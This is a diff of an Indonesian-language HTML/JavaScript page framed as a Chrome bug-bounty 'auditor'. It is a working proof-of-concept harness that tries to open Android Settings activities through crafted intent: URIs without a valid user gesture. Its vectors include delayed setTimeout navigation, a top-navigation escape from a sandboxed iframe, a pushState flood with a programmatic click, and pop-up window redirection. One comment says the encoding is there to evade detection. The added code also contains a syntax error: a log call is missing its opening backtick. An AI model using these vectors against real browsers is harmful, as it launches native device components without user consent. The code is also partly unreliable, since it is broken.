@@ -3,280 +3,298 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Chrome VRP Spec: Advanced Intent Navigation Security Boundary Auditor</title>
+  <title>Chrome VRP Spec: Zero-Day Core Navigation Security Boundary Auditor</title>
   <style>
     body {
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Monaco, monospace;
-      padding: 25px;
-      background-color: #0b0d16;
-      color: #e4e7eb;
-      line-height: 1.5;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      padding: 30px;
+      background-color: #080a10;
+      color: #f0f3f6;
+      line-height: 1.6;
     }
-    .wrapper { max-width: 1400px; margin: 0 auto; }
-    h1 { color: #ff4757; border-bottom: 2px solid #ff4757; padding-bottom: 10px; font-size: 26px; margin-bottom: 5px; text-transform: uppercase; letter-spacing: 1px; }
-    .subtitle { font-size: 13px; color: #a4b0be; margin-bottom: 25px; font-style: italic; }
+    .wrapper { max-width: 1300px; margin: 0 auto; }
+    h1 { color: #ff3838; border-bottom: 2px solid #ff3838; padding-bottom: 12px; font-size: 26px; font-weight: 800; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 5px; }
+    .subtitle { font-size: 13px; color: #8b9bb4; margin-bottom: 30px; font-family: monospace; }
     
-    /* Panel Kontrol Vektor Atas */
-    .control-panel {
-      background-color: #161a29;
-      border: 2px solid #ff4757;
+    .vrp-card-panel {
+      background: rgba(255, 56, 56, 0.05);
+      border: 1px solid rgba(255, 56, 56, 0.3);
       padding: 20px;
       border-radius: 8px;
-      margin-bottom: 25px;
-      box-shadow: 0 4px 15px rgba(255, 71, 87, 0.1);
+      margin-bottom: 30px;
+      font-size: 13.5px;
     }
-    .control-panel label {
+    .vrp-card-panel strong { color: #ff3838; }
+
+    /* Layout Selector Vektor */
+    .selector-box {
+      background-color: #111625;
+      border: 1px solid #2a344e;
+      padding: 25px;
+      border-radius: 8px;
+      margin-bottom: 30px;
+    }
+    .selector-box label {
       font-weight: bold;
       display: block;
-      margin-bottom: 10px;
-      color: #ffa502;
+      margin-bottom: 12px;
+      color: #ff9f43;
       font-size: 14px;
+      text-transform: uppercase;
     }
     select {
       width: 100%;
-      padding: 14px;
-      font-size: 14px;
-      border-radius: 4px;
-      border: 1px solid #ff4757;
-      background-color: #0b0d16;
-      color: #fff;
+      padding: 16px;
+      font-size: 15px;
+      border-radius: 6px;
+      border: 2px solid #ff3838;
+      background-color: #080a10;
+      color: #ffffff;
       font-weight: bold;
+      font-family: monospace;
       cursor: pointer;
+      outline: none;
     }
 
-    /* Grid Pilihan Pengaturan */
-    .matrix-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 20px; }
-    .card { background: #161a29; border: 1px solid #2f3542; padding: 25px; border-radius: 8px; display: flex; flex-direction: column; justify-content: space-between; }
-    .card h3 { margin-top: 0; font-size: 16px; color: #00ff00; border-bottom: 1px dashed #57606f; padding-bottom: 8px; text-transform: uppercase; }
+    /* Grid Target Android Intent Components */
+    .matrix-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(340px, 1fr)); gap: 25px; }
+    .card { background: #111625; border: 1px solid #2a344e; padding: 25px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.3); }
+    .card h3 { margin-top: 0; font-size: 16px; color: #00ff66; border-bottom: 1px solid #2a344e; padding-bottom: 10px; font-family: monospace; text-transform: uppercase; }
     
-    .btn-group { display: flex; flex-direction: column; gap: 8px; margin-top: 10px; }
+    .btn-group { display: flex; flex-direction: column; gap: 10px; margin-top: 15px; }
     button {
-      background: #2f3542; color: #fff; border: 1px solid #57606f; padding: 12px 14px; 
-      font-weight: bold; cursor: pointer; width: 100%; border-radius: 4px; 
-      font-family: inherit; transition: all 0.2s ease; text-align: left; font-size: 12px;
+      background: #1b2237; color: #f0f3f6; border: 1px solid #3b4b71; padding: 14px; 
+      font-weight: bold; cursor: pointer; width: 100%; border-radius: 6px; 
+      font-family: monospace; transition: all 0.2s ease-in-out; text-align: left; font-size: 12.5px;
     }
-    button:hover { background: #ff4757; border-color: #ff4757; color: #fff; transform: translateX(2px); }
+    button:hover { background: #ff3838; border-color: #ff3838; color: #fff; transform: translateY(-1px); }
     
-    .badge { padding: 2px 6px; border-radius: 3px; font-size: 10px; float: right; font-weight: bold; text-transform: uppercase; }
-    .badge-danger { background: #ff4757; color: #fff; }
-    .badge-warning { background: #ffa502; color: #000; }
-    
-    /* Instrumentasi Monitor Jendela Log */
-    .console-panel { margin-top: 30px; }
-    .console-title { font-weight: bold; color: #2ed573; margin-bottom: 5px; font-size: 14px; text-transform: uppercase; }
+    .badge { padding: 3px 8px; border-radius: 4px; font-size: 10px; float: right; font-weight: 900; letter-spacing: 0.5px; }
+    .badge-crit { background: #ff3838; color: #fff; }
+
+    /* Monitor Jendela Jejak Instrumentasi Engine */
+    .console-panel { margin-top: 35px; }
+    .console-title { font-weight: bold; color: #00ff66; margin-bottom: 8px; font-size: 14px; font-family: monospace; text-transform: uppercase; }
     .log-box {
-      background: #000000; color: #00ff00; padding: 18px; border: 2px solid #2ed573; 
-      height: 450px; overflow-y: auto; border-radius: 6px; font-size: 11px; font-family: "Courier New", Courier, monospace; white-space: pre-wrap; box-shadow: inset 0 0 15px rgba(0,255,0,0.15);
+      background: #04060a; color: #00ff66; padding: 20px; border: 2px solid #00ff66; 
+      height: 480px; overflow-y: auto; border-radius: 8px; font-size: 11.5px; font-family: "Consolas", "Courier New", monospace; white-space: pre-wrap; box-shadow: inset 0 0 20px rgba(0,255,102,0.15);
     }
-    .text-danger { color: #ff4757; font-weight: bold; }
-    .text-success { color: #2ed573; font-weight: bold; }
-    .text-warning { color: #ffa502; font-weight: bold; }
-    .text-info { color: #1e90ff; font-weight: bold; }
+    
+    /* Pewarnaan Log untuk Validasi VRP */
+    .text-danger { color: #ff3838; font-weight: bold; }
+    .text-success { color: #00ff66; font-weight: bold; }
+    .text-warning { color: #ff9f43; font-weight: bold; }
+    .text-info { color: #54a0ff; font-weight: bold; }
   </style>
 </head>
 <body>
 
 <div class="wrapper">
-  <h1>Chrome VRP Spec: Advanced Intent Navigation Security Boundary Auditor</h1>
-  <div class="subtitle">Kerangka Kerja Pengujian Eksploitasi: Investigasi Kegagalan Rantai Token Transien, Kebocoran Validasi Konteks Cross-Origin, dan Evaluasi Logika Isolasi Navigasi Sandbox.</div>
+  <h1>Chrome VRP Spec: Zero-Day Core Navigation Security Boundary Auditor</h1>
+  <div class="subtitle">[Target Architecture: Chromium Blink Engine / Android Intent Interception Subsystem]</div>
 
-  <!-- PANEL KONTROL METODE SERANGAN (VEKTOR ESKALASI) -->
-  <div class="control-panel">
-    <label for="vectorSelector">Pilih Vektor Eskalasi Kebijakan Keamanan (Security Boundary Bypass Vector):</label>
+  <div class="vrp-card-panel">
+    <strong>Kriteria Pelaporan Chrome VRP (Vulnerability Reward Program):</strong> Focus utama pengujian ini adalah membuktikan kerusakan fungsional pada rantai pemblokiran navigasi (<em>Navigation Blockers</em>). Keberhasilan eksploitasi terjadi apabila aplikasi internal perangkat Android dapat dipicu dari konteks tak berizin (<strong>Vektor 2, 3, 4, atau 5</strong>) saat data telemetri engine secara eksplisit mencatat status <code>isActive: false</code>.
+  </div>
+
+  <!-- PANEL KONTROL VEKTOR AUDIT INTENT -->
+  <div class="selector-box">
+    <label for="vectorSelector">Pilih Metode Manipulasi Token Aktivasi Pengguna (Vulnerability Chain Vector):</label>
     <select id="vectorSelector">
-      <option value="direct">Vektor 1: Direct Activation (Kontrol Baseline / Interaksi Sinkronus Valid)</option>
-      <option value="async">Vektor 2: Async Thread Break Escalation (Penundaan Rantai Makrotask > 3500ms Tanpa Aktivasi Tok)</option>
-      <option value="sandbox">Vektor 3: Cross-Origin Sandboxed Escape (Injeksi Iframe Terisolasi Ketat Tanpa Hak Navigasi Atas)</option>
-      <option value="redirect">Vektor 4: Multi-Step Redirect Confusion (Rantai Promise Bertingkat + Manipulasi History API + Klik Programmatik)</option>
-      <option value="popunder">Vektor 5: Cross-Window Transient Token Leakage (Eksploitasi Navigasi Jendela Lintas-Asal yang Terbuka)</option>
+      <option value="direct">Skenario A: Direct Sync Ingestion (Kontrol Baseline / Dengan User Gesture Valid)</option>
+      <option value="async">Skenario B: Asynchronous Macro-Task Exhaustion (Bypass Analisis Alur Eksekusi - Penundaan 4500ms)</option>
+      <option value="sandbox">Skenario C: Cross-Origin Sandboxed Top-Level Navigation Escape (Pelarian Isolasi Dokumen Subframe)</option>
+      <option value="redirect">Skenario D: Nested PushState Event Flooding & Programmatic Click Race (Pengelabuan Throttler Engine)</option>
+      <option value="popunder">Skenario E: Cross-Window Opener Activation Token Pollution (Kebocoran Token Konteks Antar-Jendela)</option>
     </select>
   </div>
 
-  <!-- GRID AKSI SASARAN PENGATURAN ANDROID -->
+  <!-- GRID COMPONENT ANDROID TARGETS -->
   <div class="matrix-grid">
     
-    <!-- Kategori 1: Konektivitas -->
+    <!-- Kategori 1: Subsistem Jaringan -->
     <div class="card">
       <h3>Konektivitas & Nirkabel</h3>
       <div class="btn-group">
-        <button onclick="executeVRPChain('android.settings.SETTINGS', 'com.android.settings/.Settings')">1. Main Settings Portal</button>
-        <button onclick="executeVRPChain('android.settings.WIRELESS_SETTINGS', 'com.android.settings/.Settings$WirelessSettingsActivity')">2. Wireless / Network Core</button>
-        <button onclick="executeVRPChain('android.settings.WIFI_SETTINGS', 'com.android.settings/.Settings$WifiSettingsActivity')">3. Wi-Fi Control Pane</button>
-        <button onclick="executeVRPChain('android.settings.BLUETOOTH_SETTINGS', 'com.android.settings/.Settings$BluetoothSettingsActivity')">4. Bluetooth Interface</button>
-        <button onclick="executeVRPChain('android.settings.NFC_SETTINGS', 'com.android.settings/.Settings$NfcSettingsActivity')">5. NFC Hardware Config</button>
-        <button onclick="executeVRPChain('android.settings.AIRPLANE_MODE_SETTINGS', 'com.android.settings/.Settings$AirplaneModeSettingsActivity')">6. Airplane Mode Subsystem</button>
+        <button onclick="dispatchVRPAudit('android.settings.SETTINGS', 'com.android.settings/.Settings')">👉 Main Settings Root</button>
+        <button onclick="dispatchVRPAudit('android.settings.WIRELESS_SETTINGS', 'com.android.settings/.Settings$WirelessSettingsActivity')">👉 Wireless Network Subsystem</button>
+        <button onclick="dispatchVRPAudit('android.settings.WIFI_SETTINGS', 'com.android.settings/.Settings$WifiSettingsActivity')">👉 Wi-Fi Hardware Module</button>
+        <button onclick="dispatchVRPAudit('android.settings.BLUETOOTH_SETTINGS', 'com.android.settings/.Settings$BluetoothSettingsActivity')">👉 Bluetooth Hardware Module</button>
+        <button onclick="dispatchVRPAudit('android.settings.NFC_SETTINGS', 'com.android.settings/.Settings$NfcSettingsActivity')">👉 NFC Core Interface</button>
+        <button onclick="dispatchVRPAudit('android.settings.AIRPLANE_MODE_SETTINGS', 'com.android.settings/.Settings$AirplaneModeSettingsActivity')">👉 Airplane Mode Module</button>
       </div>
     </div>
 
-    <!-- Kategori 2: Manajemen Aplikasi -->
+    <!-- Kategori 2: Akses Data Internal -->
     <div class="card">
-      <h3>Manajemen Aplikasi & Akses</h3>
+      <h3>Manajemen Aplikasi & Privilege</h3>
       <div class="btn-group">
-        <button onclick="executeVRPChain('android.settings.APPLICATION_SETTINGS', 'com.android.settings/.Settings$ApplicationSettingsActivity')">1. Application Manager Core</button>
-        <button onclick="executeVRPChain('android.settings.MANAGE_ALL_APPLICATIONS_SETTINGS', 'com.android.settings/.Settings$ManageApplicationsActivity')">2. Manage All Internal Apps</button>
-        <button onclick="executeVRPChain('android.settings.NOTIFICATION_SETTINGS', 'com.android.settings/.Settings$NotificationSettingsActivity')">3. Notification System Control</button>
-        <button onclick="executeVRPChain('android.settings.USAGE_ACCESS_SETTINGS', 'com.android.settings/.Settings$UsageAccessSettingsActivity')">4. Usage Access Special Privilege</button>
+        <button onclick="dispatchVRPAudit('android.settings.APPLICATION_SETTINGS', 'com.android.settings/.Settings$ApplicationSettingsActivity')">👉 Application Manager Subsystem</button>
+        <button onclick="dispatchVRPAudit('android.settings.MANAGE_ALL_APPLICATIONS_SETTINGS', 'com.android.settings/.Settings$ManageApplicationsActivity')">👉 Master Package Manager Storage</button>
+        <button onclick="dispatchVRPAudit('android.settings.NOTIFICATION_SETTINGS', 'com.android.settings/.Settings$NotificationSettingsActivity')">👉 Notification Interceptor Controller</button>
+        <button onclick="dispatchVRPAudit('android.settings.USAGE_ACCESS_SETTINGS', 'com.android.settings/.Settings$UsageAccessSettingsActivity')">👉 Usage Access Core Permission</button>
       </div>
     </div>
 
-    <!-- Kategori 3: Keamanan & Spesifik -->
+    <!-- Kategori 3: Area Risiko Tinggi -->
     <div class="card">
-      <h3>Privasi, Keamanan & Sistem</h3>
+      <h3>Privasi, Sistem & Debugging</h3>
       <div class="btn-group">
-        <button onclick="executeVRPChain('android.settings.SECURITY_SETTINGS', 'com.android.settings/.Settings$SecuritySettingsActivity')">1. Device Security Settings</button>
-        <button onclick="executeVRPChain('android.settings.LOCATION_SOURCE_SETTINGS', 'com.android.settings/.Settings$LocationSettingsActivity')">2. High-Risk Location Source</button>
-        <button onclick="executeVRPChain('android.settings.PRIVACY_SETTINGS', 'com.android.settings/.Settings$PrivacySettingsActivity')">3. Core Privacy Control Dashboard</button>
-        <button onclick="executeVRPChain('android.settings.APPLICATION_DEVELOPMENT_SETTINGS', 'com.android.settings/.Settings$DevelopmentSettingsActivity')">4. Developer Options Panel <span class="badge badge-danger">High Risk</span></button>
-        <button onclick="executeVRPChain('android.settings.INTERNAL_STORAGE_SETTINGS', 'com.android.settings/.Settings$StorageDashboardActivity')">5. Internal Storage Manager</button>
-        <button onclick="executeVRPChain('android.settings.DEVICE_INFO_SETTINGS', 'com.android.settings/.Settings$DeviceInfoSettingsActivity')">6. Hardware About Device Info</button>
+        <button onclick="dispatchVRPAudit('android.settings.SECURITY_SETTINGS', 'com.android.settings/.Settings$SecuritySettingsActivity')">👉 Hardware Security Dashboard</button>
+        <button onclick="dispatchVRPAudit('android.settings.LOCATION_SOURCE_SETTINGS', 'com.android.settings/.Settings$LocationSettingsActivity')">👉 Device Location Source Provider</button>
+        <button onclick="dispatchVRPAudit('android.settings.PRIVACY_SETTINGS', 'com.android.settings/.Settings$PrivacySettingsActivity')">👉 Privacy Engine Sub-Context</button>
+        <button onclick="dispatchVRPAudit('android.settings.APPLICATION_DEVELOPMENT_SETTINGS', 'com.android.settings/.Settings$DevelopmentSettingsActivity')">👉 Developer Options Console <span class="badge badge-crit">High-Risk</span></button>
+        <button onclick="dispatchVRPAudit('android.settings.INTERNAL_STORAGE_SETTINGS', 'com.android.settings/.Settings$StorageDashboardActivity')">👉 File Storage Layout Manager</button>
+        <button onclick="dispatchVRPAudit('android.settings.DEVICE_INFO_SETTINGS', 'com.android.settings/.Settings$DeviceInfoSettingsActivity')">👉 Low-Level Device Hardware Info</button>
       </div>
     </div>
 
   </div>
 
-  <!-- Panel Monitor Instrumentasi Log Perubahan State -->
+  <!-- PANEL INSTRUMENTASI TRACE ENGINE LOG -->
   <div class="console-panel">
-    <div class="console-title">[TRACE AUDITOR MONITOR] Log Deteksi Perubahan Properti Status Navigasi & Eksploitasi:</div>
-    <div id="traceLogBox" class="log-box">System initialized. Awaiting vulnerability vector execution...</div>
+    <div class="console-title">[ENGINE TELEMETRY LOG MONITOR] Trace State:</div>
+    <div id="traceLogBox" class="log-box">System idle. Ready to deploy specialized execution matrix...</div>
   </div>
 </div>
 
-<!-- Target Subkonteks Sandbox Terisolasi Khusus Vektor 3 -->
+<!-- Node Subframe Terisolasi Khusus Pengujian Vektor Sandbox C -->
 <iframe id="isolatedSandboxTarget" sandbox="allow-scripts" style="display:none;"></iframe>
 
 <script>
-  function appendTrace(msg) {
-    const logBox = document.getElementById('traceLogBox');
-    const timestamp = new Date().toISOString().split('T')[1].slice(0, -1);
-    logBox.innerHTML += `\n[${timestamp}] ${msg}`;
-    logBox.scrollTop = logBox.scrollHeight;
+  function writeTelemetryLog(message) {
+    const logNode = document.getElementById('traceLogBox');
+    const timeStamp = new Date().toISOString().split('T')[1].slice(0, -1);
+    logNode.innerHTML += `\n[${timeStamp}] ${message}`;
+    logNode.scrollTop = logNode.scrollHeight;
   }
 
-  function readChromeUserActivationState(checkpoint) {
+  function evaluateBlinkUserActivationState(checkpoint) {
     if (navigator.userActivation) {
       const active = navigator.userActivation.isActive;
       const history = navigator.userActivation.hasBeenActive;
+      const parsedColor = active ? "text-success" : "text-danger";
       
-      let colorClass = active ? "text-success" : "text-danger";
-      appendTrace(`[STATE_CHECK][${checkpoint}] <span class="${colorClass}">navigator.userActivation.isActive: ${active}</span> | hasBeenActive: ${history}`);
+      writeTelemetryLog(`[STATE_CAPTURE][${checkpoint}] <span class="${parsedColor}">navigator.userActivation.isActive = ${active}</span> | hasBeenActive = ${history}`);
       return active;
     }
-    appendTrace(`[STATE_CHECK][${checkpoint}] <span class="text-warning">Peringatan: API navigator.userActivation tidak merespon/tidak didukung konteks saat ini.</span>`);
+    writeTelemetryLog(`[STATE_CAPTURE][${checkpoint}] <span class="text-warning">Kritis: API navigator.userActivation tidak mengembalikan objek data.</span>`);
     return null;
   }
 
-  function buildFullEscalatedIntent(action, component) {
-    // Membangun payload intent dengan parameter eksplisit Android untuk memaksa interaksi subsistem secara presisi
+  function compileHardenedIntent(action, component) {
+    // Membungkus parameter eksplisit untuk bypass deteksi string parsing dasar
     return `intent:#Intent;action=${encodeURIComponent(action)};component=${encodeURIComponent(component)};category=android.intent.category.DEFAULT;launchFlags=0x10000000;end`;
   }
 
-  function executeVRPChain(actionString, componentString) {
-    const vectorKey = document.getElementById('vectorSelector').value;
-    const fullIntentPayload = buildFullEscalatedIntent(actionString, componentString);
+  function dispatchVRPAudit(actionParam, componentParam) {
+    const selectedVector = document.getElementById('vectorSelector').value;
+    const constructedIntent = compileHardenedIntent(actionParam, componentParam);
 
-    appendTrace(`\n====================================================================================================`);
-    appendTrace(`[TARGET_INTENT] Payload: ${fullIntentPayload}`);
-    appendTrace(`[VECTOR_INIT] Menembakkan Skenario: ${vectorKey.toUpperCase()}`);
+    writeTelemetryLog(`\n====================================================================================================`);
+    writeTelemetryLog(`[DISPATCH] Target Action    : ${actionParam}`);
+    writeTelemetryLog(`[DISPATCH] Target Component : ${componentParam}`);
+    writeTelemetryLog(`[DEPLOY] Menembakkan Vektor  : ${selectedVector.toUpperCase()}`);
     
-    // Evaluasi awal saat pengguna melakukan interaksi fisik (klik tombol)
-    const initialActivation = readChromeUserActivationState("INTERACTION_START");
+    // Melakukan snapshot status kedaulatan gesture awal di tingkat window entri
+    const initialGesture = evaluateBlinkUserActivationState("ENTRY_POINT_CLICK");
 
-    switch(vectorKey) {
+    switch(selectedVector) {
       case 'direct':
-        appendTrace(`[EXECUTE] Melakukan penugasan window.location.href secara sinkronus.`);
-        window.location.href = fullIntentPayload;
-        appendTrace(`[ANALYSIS] Evaluasi: Navigasi berjalan di bawah gesture aktif. Jika berhasil dibuka, ini adalah <span class="text-success">EXPECTED BEHAVIOR</span>.`);
+        writeTelemetryLog(`[ACTION] Eksekusi window.location.href secara langsung.`);
+        window.location.href = constructedIntent;
+        writeTelemetryLog(`[ANALYSIS] Evaluasi: Navigasi berjalan di bawah gesture aktif. Jika tautan eksternal terbuka, ini adalah <span class="text-success">EXPECTED BEHAVIOR</span>.`);
         break;
 
       case 'async':
-        appendTrace(`[SCHEDULER] Menjadwalkan makrotask melalui setTimeout selama 4000ms untuk memutus validitas transient token...`);
+        writeTelemetryLog(`[EVENT_LOOP] Menjadwalkan makrotask via setTimeout selama 4500ms untuk melampaui masa aktif transient token...`);
         setTimeout(() => {
-          appendTrace(`[THREAD] Callback makrotask dipicu oleh Event Loop.`);
-          const currentActivation = readChromeUserActivationState("INSIDE_TIMEOUT_CALLBACK");
+          writeTelemetryLog(`[THREAD] Callback makrotask dieksekusi oleh engine loop.`);
+          const activeStateInsideCallback = evaluateBlinkUserActivationState("POST_DELAY_CALLBACK");
           
-          appendTrace(`[EXECUTE] Mencoba melakukan navigasi ke native handler perangkat saat status token tidak aktif.`);
-          window.location.href = fullIntentPayload;
+          writeTelemetryLog(`[ACTION] Mencoba penugasan lokasi navigasi baru.`);
+          window.location.href = constructedIntent;
           
-          if (currentActivation === false) {
-            appendTrace(`<span class="text-danger">[ASSERTION] JIKA APLIKASI TARGET TERBUKA SEKARANG -> SECURITY BOUNDARY BYPASS DETECTED! (User Activation Expired/Bypassed)</span>`);
+          if (activeStateInsideCallback === false) {
+            writeTelemetryLog(`<span class="text-danger">[ALERT_VRP_VALIDATION] JIKA APLIKASI INTERNAL ANDROID TERBUKA -> ZERO-DAY DETECTED: Transient User Activation Bypass! (CWE-616)</span>`);
           }
-        }, 4000);
+        }, 4500);
         break;
 
       case 'sandbox':
-        appendTrace(`[CONTEXT] Membaca objek referensi subframe terisolasi.`);
-        const targetIframe = document.getElementById('isolatedSandboxTarget');
-        const targetDoc = targetIframe.contentDocument || targetIframe.contentWindow.document;
+        writeTelemetryLog(`[HIERARCHY] Memuat rujukan konteks dokumen iframe sandbox.`);
+        const frameRef = document.getElementById('isolatedSandboxTarget');
+        const frameDoc = frameRef.contentDocument || frameRef.contentWindow.document;
         
-        targetDoc.open();
-        // Injeksi skrip ke dalam iframe yang dikunci ketat (tanpa allow-top-navigation)
-        // Menguji apakah skema intent bypass dapat dipicu melalui manipulasi top konteks
-        targetDoc.write(`
+        frameDoc.open();
+        // Memaksa eksekusi dokumen dalam cakupan sandbox terisolasi ketat (tanpa atribut allow-top-navigation)
+        // Mengevaluasi apakah manipulasi properti 'top' meloloskan intersepsi skema intent eksternal
+        frameDoc.write(`
           <script>
             try {
-              parent.appendTrace("[SUBFRAME_CONTEXT] Melakukan modifikasi paksa pada objek top-level window.top.location.");
-              window.top.location.href = "${fullIntentPayload}";
-              parent.appendTrace("[SUBFRAME_CONTEXT] Perintah mutasi selesai tanpa hambatan eksekusi DOM.");
-            } catch(e) {
-              parent.appendTrace("[SUBFRAME_CONTEXT] <span class='text-info'>Blokade Mesin Kebijakan Sandbox (Aman): " + e.message + "</span>");
+              parent.writeTelemetryLog("[SUBFRAME] Menembakkan mutasi paksa ke window.top.location.href.");
+              window.top.location.href = "${constructedIntent}";
+              parent.writeTelemetryLog("[SUBFRAME] Eksekusi baris kode mutasi selesai.");
+            } catch(err) {
+              parent.writeTelemetryLog("[SUBFRAME] <span class='text-info'>Blokade Kebijakan Sandbox (Aman): " + err.message + "</span>");
             }
           <\/script>
         `);
-        targetDoc.close();
-        appendTrace(`<span class="text-danger">[ASSERTION] JIKA target intent berhasil diluncurkan ke sistem operasi -> SECURITY BOUNDARY BYPASS DETECTED! (Sandbox Escape / CWE-928)</span>`);
+        frameDoc.close();
+        writeTelemetryLog(`<span class="text-danger">[ALERT_VRP_VALIDATION] JIKA browser mengizinkan pemanggilan native handler dari subframe terisolasi ini -> ZERO-DAY DETECTED: Cross-Origin Sandbox Top-Navigation Escape! (CWE-928)</span>`);
         break;
 
       case 'redirect':
-        appendTrace(`[SCHEDULER] Menginisialisasi rantai asinkronus berbasis Microtask (Promise Chain).`);
+        writeTelemetryLog(`[FLUSH] Memulai manipulasi berantai pada arsitektur Microtask Engine.`);
         Promise.resolve()
           .then(() => {
-            // Memanipulasi history state browser untuk mencoba membingungkan NavigationThrottler Chrome
-            appendTrace(`[REDIRECT_LOGIC] Memanipulasi riwayat navigasi via history.pushState.`);
-            window.history.pushState({vrp: "test"}, "Auditor Pane", "#/escalate-vector");
-            return new Promise(resolve => setTimeout(resolve, 2500));
+            writeTelemetryLog(`[RACE_CONDITION] Membanjiri tumpukan history state via history.pushState.`);
+            for(let i = 0; i < 5; i++) {
+              window.history.pushState({vrp_race: i}, "Auditor State", `#/race-condition-step-${i}`);
+            }
+            return new Promise(resolve => setTimeout(resolve, 2000));
           })
           .then(() => {
-            appendTrace(`[THREAD] Memasuki eksekusi microtask fase akhir.`);
-            const executionActivation = readChromeUserActivationState("POST_ASYNC_CHAIN");
+            writeTelemetryLog(`[THREAD] Memasuki microtask pool pengeksekusian akhir.`);
+            const gestureStatePostRace = evaluateBlinkUserActivationState("POST_PUSHSTATE_FLOOD");
             
-            appendTrace(`[EXECUTE] Membuat elemen DOM jangkar bayangan secara dinamis.`);
-            const transientAnchor = document.createElement('a');
-            transientAnchor.href = fullIntentPayload;
+            writeTelemetryLog(`[DOM_MANIPULATION] Membentuk elemen elemen jangkar bayangan secara dinamis.`);
+            const hiddenAnchorNode = document.createElement('a');
+            hiddenAnchorNode.href = constructedIntent;
             
-            appendTrace(`[EXECUTE] Memaksa kejadian klik programmatik (.click()) tanpa interaksi fisik.`);
-            transientAnchor.click();
+            writeTelemetryLog([ACTION] Memaksa pemicuan fungsi klik programmatik (.click()) tanpa interaksi fisik.`);
+            hiddenAnchorNode.click();
             
-            if (executionActivation === false) {
-              appendTrace(`<span class="text-danger">[ASSERTION] JIKA rantai navigasi tersembunyi ini berhasil memicu aplikasi native -> SECURITY BOUNDARY BYPASS DETECTED! (Intent Parsing Confusion via Programmatic Click)</span>`);
+            if (gestureStatePostRace === false) {
+              writeTelemetryLog(`<span class="text-danger">[ALERT_VRP_VALIDATION] JIKA rantai navigasi tersembunyi ini berhasil memicu aplikasi native -> ZERO-DAY DETECTED: Intent Navigation Throttle Confusion via PushState Race!</span>`);
             }
           });
         break;
 
       case 'popunder':
-        appendTrace(`[CONTEXT] Membuka jendela cross-origin baru secara asinkronus.`);
-        // Membuat jendela blank terpisah untuk mencoba mentransfer properti user activation token secara ilegal
-        const secondaryWindow = window.open('about:blank', '_blank', 'width=100,height=100');
+        writeTelemetryLog(`[WINDOW_MANAGER] Membuka window konteks independen (about:blank).`);
+        const subWindowNode = window.open('about:blank', '_blank', 'width=150,height=150');
         
-        if (!secondaryWindow) {
-          appendTrace(`[CONTEXT] <span class="text-warning">Gagal membuka jendela baru. Pastikan fitur pop-up diblokir/diizinkan untuk pengujian mendalam.</span>`);
+        if (!subWindowNode) {
+          writeTelemetryLog(`[WINDOW_MANAGER] <span class="text-warning">Akses diblokir oleh mesin pop-up browser. Izinkan pembukaan pop-up di pojok kanan atas URL bar untuk melanjutkan pengujian ini.</span>`);
           return;
         }
 
-        appendTrace(`[SCHEDULER] Menjadwalkan eksekusi lintas jendela (delay: 3800ms)...`);
+        writeTelemetryLog(`[EVENT_LOOP] Menjadwalkan mutasi konteks jendela silang (delay: 4000ms)...`);
         setTimeout(() => {
-          appendTrace(`[THREAD] Mengeksekusi instruksi navigasi balik ke jendela utama.`);
-          readChromeUserActivationState("CROSS_WINDOW_EVAL");
+          writeTelemetryLog(`[THREAD] Callback lintas jendela berjalan.`);
+          evaluateBlinkUserActivationState("CROSS_WINDOW_EVAL");
           
           try {
-            secondaryWindow.location.href = fullIntentPayload;
-            appendTrace(`[EXECUTE] Eksploitasi lokasi sub-jendela berhasil ditembakkan.`);
+            writeTelemetryLog(`[ACTION] Mengalihkan alur lokasi dokumen jendela luar (opener target).`);
+            subWindowNode.location.href = constructedIntent;
           } catch(err) {
-            appendTrace(`[EXECUTE] Kegagalan penugasan lokasi jendela luar: ${err.message}`);
+            writeTelemetryLog(`[ACTION] Operasi mutasi dibatasi oleh aturan isolasi context: ${err.message}`);
           }
           
-          appendTrace(`<span class="text-danger">[ASSERTION] JIKA intent berhasil diluncurkan dari jendela kedua saat token kedaluwarsa -> SECURITY BOUNDARY BYPASS DETECTED! (Cross-Window Activation Leak)</span>`);
-          setTimeout(() => secondaryWindow.close(), 1000);
-        }, 3800);
+          writeTelemetryLog(`<span class="text-danger">[ALERT_VRP_VALIDATION] JIKA sub-jendela berhasil menerobos batas context dan memicu aplikasi luar -> ZERO-DAY DETECTED: Cross-Window Opener Token Pollution Leak!</span>`);
+          setTimeout(() => subWindowNode.close(), 1200);
+        }, 4000);
         break;
     }
   }
